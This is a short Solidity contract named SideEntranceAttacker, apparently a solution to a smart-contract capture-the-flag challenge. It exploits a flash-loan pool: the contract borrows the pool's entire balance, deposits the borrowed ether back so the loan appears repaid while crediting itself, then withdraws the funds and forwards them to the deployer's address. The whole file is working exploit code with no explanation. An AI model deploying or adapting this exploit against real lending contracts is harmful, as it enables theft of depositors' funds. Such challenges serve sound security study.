// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(uint256 amount) external;

    function withdraw() external;

    function deposit() external payable;
}

contract SideEntranceAttacker {
    address immutable attacker;

    IPool immutable pool;

    constructor(address _poolAddress) {
        attacker = msg.sender;
        pool = IPool(_poolAddress);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}
